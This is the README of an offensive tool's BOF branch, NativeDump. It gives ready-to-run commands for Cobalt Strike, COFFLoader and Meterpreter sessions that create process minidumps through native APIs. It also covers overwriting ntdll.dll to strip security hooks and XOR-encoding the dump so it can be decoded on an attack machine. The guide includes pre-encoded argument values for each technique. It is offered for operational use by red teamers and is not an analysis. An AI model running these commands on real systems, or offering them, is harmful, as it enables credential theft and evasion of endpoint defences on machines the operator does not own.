# NativeDump - "bof-flavour" branch

This branch implements the same functionality as the main branch using BOF files: 

- Minidump file generation using only NTAPIS
- Overwrite the Ntdll.dll library (Optional)
- XOR encoding (Optional)

You can execute the files using Cobalt Strike, TrustedSec's [COFFLoader](https://github.com/trustedsec/COFFLoader) or Meterpreter's [bofloader module](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-executebof-command.html).

-----------------------------------------

## Cobalt Strike

You can execute the BOF file after importing the aggressor script "nativedump.cna":

```
nativedump <OVERWRITE_TECHNIQUE> <FILENAME> <XOR_KEY>
``` 

The first argument is used for overwriting ntdll.dll:
- "disk": Using a DLL already on disk. The default path is "C:\Windows\System32\ntdll.dll".    
- "knowndlls": Using the KnownDlls folder.
- "debugproc": Using a process created in debug mode. The default process is "c:\windows\system32\calc.exe".
  
![bof1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/nativedump/Screenshot_BOF1.png)

It is also possible to encode the file with a custom XOR key:

![bof1b](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/nativedump/Screenshot_BOF1b.png)

And then decode it using Decoder.exe in the attack machine:

```
Decoder.exe <INPUT_FILE> <OUTPUT_FILE> <XOR_KEY>
```

![c4](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/nativedump/Screenshot_C4.png)

-----------------------------------------

## COFFLoader

```
COFFLoader64.exe go nativedump_bof.o <OVERWRITE_TECHNIQUE> <FILENAME> <XOR_KEY>
```

![bof2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/nativedump/Screenshot_BOF2.png)

The arguments must be generated using COFFLoader's [beacon_generate.py script](https://github.com/trustedsec/COFFLoader/blob/main/beacon_generate.py). If you want to use only the first argument the values are:
- "disk": Use the value 09000000050000006469736b00
- "knowndlls": Use the value 0e0000000a0000006b6e6f776e646c6c7300
- "debugproc": Use the value 0e0000000a000000646562756770726f6300
  
Example using the option "disk":

```
COFFLoader64.exe go nativedump_bof.o 09000000050000006469736b00
```

![bof3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/nativedump/Screenshot_BOF3.png)

--------------------------------------

## Meterpreter's bofloader module

You can run BOF files in your Meterpreter session after loading the "bofloader" module. It is important to interact with the session with a timeout around 60 seconds, so the BOF can finish execution:

```
sessions -i <SESSION-ID> --timeout 60
load bofloader
execute_bof nativedump_bof.o --format-string zzz <OVERWRITE_TECHNIQUE> <FILENAME> <XOR_KEY>
```

![bof4](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/nativedump/Screenshot_BOF4.png)
